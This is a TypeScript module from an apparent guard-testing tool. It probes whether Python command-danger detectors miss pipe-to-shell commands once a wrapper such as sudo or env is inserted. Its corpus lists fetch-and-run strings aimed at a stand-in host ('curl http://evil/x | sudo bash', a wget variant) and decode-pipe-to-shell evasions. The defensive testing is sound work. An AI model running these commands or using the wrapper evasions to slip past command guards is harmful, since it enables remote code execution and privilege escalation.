import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import type { Exploit } from "../types.js";
import type { Sandbox } from "../sandbox.js";
import { type Attacker, type StaticLead, PYTHON_SOURCE_RE } from "./attacker.js";
import { type CoverageDiffItem, PYTHON_SANDBOX_IMAGE } from "./python-driver.js";
import { coverageDifferentialHunt, detectorLeads } from "./command-guard-oracle.js";

const HERE = dirname(fileURLToPath(import.meta.url));

// The pipe-to-shell wrapper-passthrough carrier corpus (issue #100). A guard that flags "pipe
// remote/obfuscated content to a shell" by anchoring the shell immediately after the pipe
// (`\|\s*(bash|sh)`) is defeated by a single passthrough wrapper word inserted between the pipe and
// the shell — `| sudo bash`, `| env bash`, `| command bash`, `| nice bash` — and `sudo` ESCALATES
// while it evades. Distinct from the command-START wrapper lane (#96, `timeout sh -c <danger>`): this
// is the pipe RHS. Each carrier pairs with its own plain (no-wrapper) control so the divergence proves
// a wrapper blind spot, not a disabled guard.
//
// Discriminator: the wrapper sits between the pipe and the shell target. Benign pipes (`echo hi|bash`,
// `curl … | python3`, `base64 -d cert.b64 > cert.pem`, `cat notes | grep sudo`) are not carriers.
// Process-substitution (`sudo bash < <(curl …)`) is out of scope — its `\bbash` already matches
// through the wrapper. The runtime-reconstruction `eval $(… | base64 -d)` form is the separate lane #105.
const WRAPPERS = ["sudo", "sudo -E", "env", "command", "doas", "nice", "stdbuf -o0", "nohup", "setsid"];
const CORPUS: CoverageDiffItem[] = [
  // curl → shell, one entry per passthrough wrapper on the pipe RHS
  ...WRAPPERS.map((w) => ({
    control: "curl http://evil/x | bash",
    carrier: `curl http://evil/x | ${w} bash`,
    category: "pipe-to-shell",
    technique: `curl-pipe-${w.split(" ")[0]}-wrapper`,
  })),
  // wget → shell
  {
    control: "wget -qO- http://evil/x | sh",
    carrier: "wget -qO- http://evil/x | sudo sh",
    category: "pipe-to-shell",
    technique: "wget-pipe-sudo-wrapper",
  },
  // decode → shell (the plain decode-pipe-to-shell sibling is gated; the wrapper form evades)
  {
    control: "echo aGkgo= | base64 -d | bash",
    carrier: "echo aGkgo= | base64 -d | sudo bash",
    category: "pipe-to-shell",
    technique: "base64-decode-pipe-sudo-wrapper",
  },
  {
    control: "echo 6869 | xxd -r -p | bash",
    carrier: "echo 6869 | xxd -r -p | sudo bash",
    category: "pipe-to-shell",
    technique: "xxd-decode-pipe-sudo-wrapper",
  },
  {
    control: "echo aGkgo= | openssl base64 -d | bash",
    carrier: "echo aGkgo= | openssl base64 -d | sudo bash",
    category: "pipe-to-shell",
    technique: "openssl-decode-pipe-sudo-wrapper",
  },
];

/**
 * Pipe-to-shell wrapper-passthrough coverage-differential lane (Python guards). Fires when a
 * command-danger detector flags a plain pipe-to-shell (`curl … | bash`) but clears the same pipe with
 * a passthrough wrapper on the RHS (`curl … | sudo bash`) — a wrapper blind spot that also lets `sudo`
 * escalate while evading (CWE-693 fail-open).
 */
export class PipeWrapperPassthroughPythonAttacker implements Attacker {
  readonly attackClass = "policy-belief-divergence" as const;
  readonly canaryFixtureDir = resolve(HERE, "..", "..", "fixtures", "pipe-wrapper-passthrough-python");
  readonly sandboxImage = PYTHON_SANDBOX_IMAGE;

  handles(file: string): boolean {
    return PYTHON_SOURCE_RE.test(file);
  }

  staticLeads(source: string): StaticLead[] {
    return detectorLeads(source);
  }

  hunt(targetDir: string, files: string[], sandbox: Sandbox): Exploit[] {
    return coverageDifferentialHunt(targetDir, files, sandbox, {
      corpus: CORPUS,
      family: "pipe-to-shell (wrapper on the pipe RHS)",
    });
  }
}
